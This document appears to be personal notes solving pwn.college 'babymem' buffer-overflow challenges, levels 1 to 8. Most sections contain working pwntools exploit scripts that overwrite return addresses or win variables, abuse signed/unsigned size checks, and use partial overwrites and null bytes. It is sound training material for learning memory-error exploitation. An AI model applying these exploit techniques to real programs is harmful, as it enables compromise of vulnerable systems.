# Pwn Babymem

## Useful stuff
```sh
# remote login
ssh -i key hacker@"www.your dojo.com"
# copy challenge to your host
scp -i key hacker@"www.your dojo.com":/challenge/* .
```
[Binary Ninja](https://cloud.binary.ninja/)

[Pwn college Memory Error Lecture](https://www.youtube.com/watch?v=hUUcsFPeH9w&t=5236s)

## 1.0 - 1.1
```py
from pwn import *                       
                                        
padding = b'A' * 176                    
payload = padding + p64(0x2dbba028)     
                                        
p = process('/challenge/babymem_level1.0')         
p.recvuntil('size:')                    
p.sendline('120')                       
                                       
p.recvuntil('bytes)!')                  
p.send(payload)                         
p.interactive() 
```

## 2.0 2.1
```py
from pwn import *                       
                                        
padding = b'A' * 528                    
payload = padding + p64(0xdeadbeef)     
                                        
p = process('/challenge/babymem_level2.0')         
p.recvuntil('size:')                    
p.sendline('530')                       
                                       
p.recvuntil('bytes)!')                  
p.send(payload)                         
p.interactive() 
```
Task: You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x55c46aa5e8c0, 528 bytes after the start of your input buffer.

## 3.0 
```py
from pwn import *                       
                                        
padding = b'A' * 104                   
payload = padding + p64(0x4018d1) # win address
                                        
p = process('/challenge/babymem_level3.0')         
p.recvuntil('size:')                    
p.sendline('120')                       
                                       
p.recvuntil('bytes)!')                  
p.send(payload)                         
p.interactive() 
```
Task:
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffe6e8fec28, 104 bytes after the start of your input buffer.
That means that you will need to input at least 112 bytes (73 to fill the buffer,
31 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

## 3.1
used gdb to locate buffer size from `challange` and `win` address

## 4.0
Task: In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffe4e15aa08, 88 bytes after the start of your input buffer.
That means that you will need to input at least 96 bytes (66 to fill the buffer,
22 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

```py
from pwn import *                       
                                        
padding = b'A' * 88                   
payload = padding + p64(0x401818)     
                                        
p = process('/challenge/babymem_level4.0')         
p.recvuntil('size:')                    
p.sendline('-66')  #jns jump if not signed (positive)                       
                                       
p.recvuntil('bytes)!')                  
p.send(payload)                         
p.interactive() 
```

## 4.1 
search jump address to `win`

## 5.0
You will want to overwrite the return value from challenge()
(located at 0x7ffd1d851b88, 88 bytes past the start of the input buffer)
with 0x401ace, which is the address of the win() function.
This will cause challenge() to return directly into the win() function,
which will in turn give you the flag.
Keep in mind that you will need to write the address of the win() function
in little-endian (bytes backwards) so that it is interpreted properly.

NOTE: unsigned vs signed ints

```py
from pwn import *                       
                                        
padding = b'A' * 88  # find it with gdb on ret challenge               
payload = padding + p64(0x401ace)    

p = process('/challenge/babymem_level5.0')         
p.recvuntil('records to send:')    
num = int("0x80000000",0)     
tosend = f'{str(num)}\n'           
p.sendline(tosend.encode())                       
                                       
p.recvuntil('payload record:')     
p.send('2\n') 

    
p.send(payload)                         
p.interactive() 

```

## 6.0 - 6.1
Task: search `win_a...` function address using gdb `info func`, find `print` address and jump to it 

## 7.0
Task:Overwriting the entire return address is fine when we know
the whole address, but here, we only really know the last three nibbles.
These nibbles never change, because pages are aligned to 0x1000.
This gives us a workaround: we can overwrite the least significant byte
of the saved return address, which we can know from debugging the binary,
to retarget the return to main to any instruction that shares the other 7 bytes.
Since that last byte will be constant between executions (due to page alignment),
this will always work.

Note: try until the number you put pops out
```py
from pwn import *                       
                                        
padding = b'B' * 136            
payload = padding + b"\x90\x24"    #\x90 = +28

p = process('/challenge/babymem_level7.0')         
p.read()
p.sendline('144')
p.send(payload)   # important! with sendline it changes the length cz it sends another byte '\n'                    
p.interactive() 
```
## 7.1 
find `win_a...` address and buffer size, try until flag pops out
Magic number = 2147483648

## 8.0
Task:
So how do you pass the check? There *is* a way, and we will cover it later,
but for now, we will simply bypass it! You can overwrite the return address
with *any* value (as long as it points to executable code), not just the start
of functions. Let's overwrite past the token check in win!

Like 7.0 but but bypass unsigned comparison 

```py

from pwn import *                       
                                        
padding = b'B' * 45            
payload = padding + b"\x00"+b'A'*42 + b"\x10\xBA"    

p = process('/challenge/babymem_level8.0')         
p.read()
p.sendline('2147483648')
p.send(payload)                         
p.interactive() 
```
hint: man strlen

## 8.1 
Note: find buffer size and win_a.. address and play with it

